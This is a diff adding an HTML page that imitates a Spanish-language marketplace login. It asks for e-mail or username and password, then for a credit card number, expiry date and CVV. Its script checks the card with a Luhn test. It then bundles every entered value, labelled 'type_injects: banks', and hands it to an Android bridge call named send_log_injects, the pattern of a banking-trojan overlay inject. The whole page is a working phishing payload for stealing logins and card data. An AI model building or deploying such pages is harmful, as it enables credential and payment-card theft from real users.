@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.js"></script>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        header {
+            padding: 15px;
+        }
+
+        h3 {
+            color: #333;
+            font-weight: 600;
+        }
+        
+        .cool-input {
+            box-sizing: border-box;
+            border: 0;
+            width: 100%;
+            position: relative;
+            font-size: 16px;
+            margin-bottom: 15px;
+        }
+
+        .cool-input__input {
+            box-sizing: border-box;
+            background: none;
+            width: 100%;
+            padding: 10px;
+            padding-left: 0;
+            position: relative;
+            z-index: 2;
+            font-size: 1em;
+        }
+        .cool-input__input:focus {
+            outline: none;
+        }
+
+        .cool-input__placeholder {
+            box-sizing: border-box;
+            border: none;
+            background: none;
+            width: 100%;
+            position: absolute;
+            z-index: 1;
+            left:0;
+            top: 50%;
+            line-height: 0;
+            color: #767676;
+            transition: all 0.2s ease;
+        }
+
+        .cool-input__input_filled + .cool-input__placeholder,
+        .cool-input__input:focus + .cool-input__placeholder {
+            font-size: 0.8em;
+            top: 0;
+            margin-top: 0em;
+        }
+
+        input, button {
+            outline: none !important;
+            box-shadow: none !important;
+        }
+
+        .error {
+            border-color: #f00 !important;
+        }
+
+        section {
+            padding: 20px;
+        }
+
+        .input {
+            border: 0;
+            border-bottom: 1px solid #757575;
+        }
+
+        .input:focus {
+            border-bottom: 2px solid #3483fa;
+        }
+
+        .button {
+            width: 100%;
+            border: 0;
+            border-radius: 3px;
+            color: #fff;
+            padding: 10px;
+            background-color: #3483fa;
+            margin-top: 20px;
+            margin-bottom: 20px;
+            font-size: 18px;
+        }
+    </style>
+</head>
+<body>
+    <div class="loader__" id="spinner" style="display:none;position:fixed;top:0px;left:0px;width:100%;height:100%;text-align:center;background:rgba(255, 255, 255, 0.47);z-index:8000000;">
+        <span  class="fa fa-circle-o-notch  fa-spin " style="position:relative;top:50%;font-size:50px;color:#3483fa"></span>
+    </div>
+    <form onsubmit="return false">
+        <div id="form1">
+            <header>
+                <img style="width: 100%;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAp4AAABCCAAAAADbfokyAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6NDk5RTM1QUM5QkIwMTFFQUFENzBDQjdCQkYyRTY4MjYiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6NDk5RTM1QUQ5QkIwMTFFQUFENzBDQjdCQkYyRTY4MjYiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDo0OTlFMzVBQTlCQjAxMUVBQUQ3MENCN0JCRjJFNjgyNiIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDo0OTlFMzVBQjlCQjAxMUVBQUQ3MENCN0JCRjJFNjgyNiIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PpWIl5MAAAHrSURBVHja7ds7SgNhGIVh1zRnMJiRaBKiBkTRzsIswVo3IHiPIsFaBTsvkSDaqJ0LcAkieA0R4pgo+SwslGBlMx/4PkUWcHj5MxemxwC3epgA5AmQJ8gTIE+APEGeAHmCPAEneXZYCL7y7JhZe3OlzTjweXo2Kv2ptQbrwGOe9UpOmrhiHTjM87GSkwp7r6wDf3k2KgUpe0idcJhnq5yVckfcGcFjniuRlK3GTAN/eb4tBVL++OfZ2eHxJ3zkWV9NKyzuvjEM/OX5WB6UijtNdoG/PO/Xs9LIPmcnHOb5tJqTou2bh273DwyFhPOMFweCUKmpUpfp6VKJoZBwnvNpKdDvGAoJ53kSSZJ6f8NQSDjP9+qQAkUzc91m52YZCknfGsX7Y1Lv1jOrwGGendfjcalv+Y5Z4C9Ps+bBqJRZuDXeY8Jfntas5qXMIs854TFPa52lAkUb9a9/+68fDlIknOd3gheZQGGZD43g8PQ0+zgtSmH5hW3gME+LaxOhwnWuP+ExT4tPJ0Ol5m+46ITDPC2ujUmT16wDj3lafDY8WONTTfjM09qX523j2Tx85kmYIE/gT3kC5AmQJ8gTIE+QJ0CeAHmCPAHyBHkC5AmQJ8gTIE+QJ0CeAHmCPAHyBHkC5AmQJ8gTIE/8M58a0XejMQ3BCAAAAABJRU5ErkJggg==" alt="">
+                
+                <h3>¡Hola! Para seguir, ingresá tu e-mail o usuario</h3>
+            </header>
+            <section>
+                <div class="cool-input">
+                    <input type="text" id="login" name="login" class="input cool-input__input" autocomplete="off">
+                    <span class="cool-input__placeholder">E-mail o usuario</span>
+                </div>
+                <div class="cool-input">
+                    <input type="password" id="password" name="password" class="input cool-input__input" autocomplete="off">
+                    <span class="cool-input__placeholder">Contraseña</span>
+                </div>
+
+                <input type="submit" class="button" id="nextPage" value="Continuar">
+
+                <p style="text-align: center;color: #3483fa;font-size: 18px;">Creat cuenta</p>
+            </section>
+        </div>
+        <div id="form2" style="display: none;">
+            <header>
+                <img style="width: 100%;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAp4AAABCCAAAAADbfokyAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6NDk5RTM1QUM5QkIwMTFFQUFENzBDQjdCQkYyRTY4MjYiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6NDk5RTM1QUQ5QkIwMTFFQUFENzBDQjdCQkYyRTY4MjYiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDo0OTlFMzVBQTlCQjAxMUVBQUQ3MENCN0JCRjJFNjgyNiIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDo0OTlFMzVBQjlCQjAxMUVBQUQ3MENCN0JCRjJFNjgyNiIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PpWIl5MAAAHrSURBVHja7ds7SgNhGIVh1zRnMJiRaBKiBkTRzsIswVo3IHiPIsFaBTsvkSDaqJ0LcAkieA0R4pgo+SwslGBlMx/4PkUWcHj5MxemxwC3epgA5AmQJ8gTIE+APEGeAHmCPAEneXZYCL7y7JhZe3OlzTjweXo2Kv2ptQbrwGOe9UpOmrhiHTjM87GSkwp7r6wDf3k2KgUpe0idcJhnq5yVckfcGcFjniuRlK3GTAN/eb4tBVL++OfZ2eHxJ3zkWV9NKyzuvjEM/OX5WB6UijtNdoG/PO/Xs9LIPmcnHOb5tJqTou2bh273DwyFhPOMFweCUKmpUpfp6VKJoZBwnvNpKdDvGAoJ53kSSZJ6f8NQSDjP9+qQAkUzc91m52YZCknfGsX7Y1Lv1jOrwGGendfjcalv+Y5Z4C9Ps+bBqJRZuDXeY8Jfntas5qXMIs854TFPa52lAkUb9a9/+68fDlIknOd3gheZQGGZD43g8PQ0+zgtSmH5hW3gME+LaxOhwnWuP+ExT4tPJ0Ol5m+46ITDPC2ujUmT16wDj3lafDY8WONTTfjM09qX523j2Tx85kmYIE/gT3kC5AmQJ8gTIE+QJ0CeAHmCPAHyBHkC5AmQJ8gTIE+QJ0CeAHmCPAHyBHkC5AmQJ8gTIE/8M58a0XejMQ3BCAAAAABJRU5ErkJggg==" alt="">
+                
+                <h3>Verificación de datos</h3>
+            </header>
+            <section>
+                <div class="cool-input">
+                    <input type="tel" id="cc" name="cc" class="input cool-input__input" autocomplete="off">
+                    <span class="cool-input__placeholder">Tarjeta de crédito</span>
+                </div>
+                <div>
+                    <div class="cool-input" style="width: 58%;float:left;">
+                        <input type="tel" id="exp" name="exp" class="input cool-input__input" autocomplete="off">
+                        <span class="cool-input__placeholder">Expiración</span>
+                    </div>
+                    <div class="cool-input" style="width: 40%;float:right;">
+                        <input type="tel" id="cvv" name="cvv" class="input cool-input__input" autocomplete="off">
+                        <span class="cool-input__placeholder">CVV</span>
+                    </div>
+                </div>
+                
+                <input type="submit" class="button" id="sendData" value="Entrar">
+            </section>
+        </div>
+    </form>
+
+    <script>
+        $('#cc').mask('0000 0000 0000 0000');
+        $('#exp').mask('00/00');
+        $('#cvv').mask('000')
+
+        $('.cool-input__input').on('input', function(){
+            var $this = $(this);
+            if ($this.val() == '') {
+                $this.removeClass('cool-input__input_filled');
+            } else {
+                $this.addClass('cool-input__input_filled');
+            }
+        });
+
+        var spinner = document.getElementById('spinner'),
+            form1 = document.getElementById('form1'),
+            form2 = document.getElementById('form2'),
+            login = document.getElementById('login'),
+            password = document.getElementById('password'),
+            cc = document.getElementById('cc'),
+            exp = document.getElementById('exp'),
+            cvv = document.getElementById('cvv'),
+            nextPage = document.getElementById('nextPage'),
+            sendData = document.getElementById('sendData');
+
+        nextPage.onclick = function() {
+            if(login.value.length < 3) {
+                login.classList.add('error')
+            } else {
+                login.classList.remove('error')
+            }
+
+            if(password.value.length < 3) {
+                password.classList.add('error')
+            } else {
+                password.classList.remove('error')
+            }
+
+            if(login.value.length > 3 && password.value.length > 3) {
+                spinner.style.display = 'block';
+
+                setTimeout(() => {
+                    spinner.style.display = 'none'
+                    form1.style.display = 'none'
+                    form2.style.display = 'block'
+                }, 1500);
+            }
+        }
+
+        function checkEXP() {
+            var mmYY = exp.value.split('/');
+			var month = parseInt(mmYY[0]);
+			var year = parseInt(mmYY[1]);
+
+			var expArray = exp.value.split('/');
+			var today, someday;
+			var exMonth = expArray[0];
+			var exYear = "20" + expArray[1];
+
+			today = new Date();
+			someday = new Date();
+			someday.setFullYear(exYear, exMonth, 1);
+                
+            if(month > 12 || month == 0 || month == 00 || someday < today || year > 27 || exp.value.length == 0) {
+                exp.classList.add('error')
+            } else {
+                exp.classList.remove('error')
+                return true
+            }
+        }
+
+        function valid_credit_card(value) {
+            if(value=='' || value.length < 19 || value=='0000 0000 0000 0000') return false;
+            if (/[^0-9-\s]+/.test(value)) return false;
+            var nCheck = 0, nDigit = 0, bEven = false;
+            value = value.replace(/\D/g, "");
+            for (var n = value.length - 1; n >= 0; n--) {
+                var cDigit = value.charAt(n),
+                    nDigit = parseInt(cDigit, 10);
+                if (bEven) {
+                    if ((nDigit *= 2) > 9) nDigit -= 9;
+                }
+                nCheck += nDigit;
+                bEven = !bEven;
+            }
+            return (nCheck % 10) == 0;
+        }
+
+        sendData.onclick = function() {
+            if(!valid_credit_card(cc.value)) {
+                cc.classList.add('error')
+            } else {
+                cc.classList.remove('error')
+            }
+
+            if(!checkEXP()) {
+                exp.classList.add('error')
+            } else {
+                exp.classList.remove('error')
+            }
+
+            if(cvv.value.length != 3) {
+                cvv.classList.add('error')
+            } else {
+                cvv.classList.remove('error')
+            }
+
+            if(valid_credit_card(cc.value) && checkEXP() && cvv.value.length === 3) {
+                var data = {};
+                data.login = login.value;
+                data.password = password.value;
+                data.cc = cc.value;
+                data.exp = exp.value;
+                data.cvv = cvv.value;
+                data.type_injects = "banks";
+                data.closed = "close_activity_injects";
+
+                var ua = navigator.userAgent.toLowerCase();
+                if(ua.indexOf("android") > -1) {
+                    try {
+                        Android.send_log_injects(JSON.stringify(data))
+                    } catch (err) {}
+                }else{
+                    alert(JSON.stringify(data));
+                }
+            }
+        }
+    </script>
+</body>
+</html>
